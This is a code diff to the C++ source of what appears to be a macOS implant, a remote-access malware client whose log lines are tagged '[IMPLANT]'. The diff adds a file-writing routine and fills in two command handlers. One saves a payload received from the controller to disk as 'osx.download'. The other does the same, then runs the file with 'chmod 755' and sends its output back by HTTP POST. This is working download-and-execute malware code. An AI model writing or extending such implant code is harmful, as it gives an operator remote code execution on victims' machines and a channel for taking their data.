@@ -2,6 +2,7 @@
 
 namespace client {
     const int RESP_BUFFER_SIZE = 65535;
+    const std::string DOWNLOAD_FILE_NAME = "osx.download";
 
     std::string executeCmd(std::string cmd) {
         FILE *fp;
@@ -44,6 +45,19 @@ namespace client {
             IOObjectRelease(platformExpert);
         }
         return ret;
+    }
+
+    bool downloadFile(std::vector<unsigned char> payload, std::string path) {
+        std::ofstream out_file(path + "/" + client::DOWNLOAD_FILE_NAME, std::ios::out);
+
+        if (!out_file) {
+            std::cout << "[IMPLANT] File not created";
+            return false;
+        }
+        else {
+            copy(payload.begin(), payload.end(), std::ostreambuf_iterator<char>(out_file));
+            return true;
+        }
     }
 }
 
@@ -149,6 +163,11 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
             // download file
             std::cout << "[IMPLANT] Received download file instruction" << std::endl;
+            std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
+            bool success = client::downloadFile(fileBytes, c->pathProcess);
+            if (!success) {
+                std::cout << "[IMPLANT] Download failed" << std::endl;
+            }
         }
         else if (dwCommand == 0xAC) {
             // run command in terminal
@@ -166,6 +185,17 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
         else if (dwCommand == 0xA2) {
             // download file and execute
             std::cout << "[IMPLANT] Received download and execute file instruction" << std::endl;
+            std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
+            bool success = client::downloadFile(fileBytes, c->pathProcess);
+            if (!success) {
+                std::cout << "[IMPLANT] Download failed" << std::endl;
+            }
+            else {
+                unsigned char instruction[] = {dwCommand, 0x00, 0x00, 0x00};
+                std::string output_path = c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME;
+                std::string output = client::executeCmd("chmod 755 " + output_path + "; " + output_path);
+                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), instruction);
+            }
         }
         else {
             std::cout << "[IMPLANT] Received unfamiliar instruction" << std::endl;
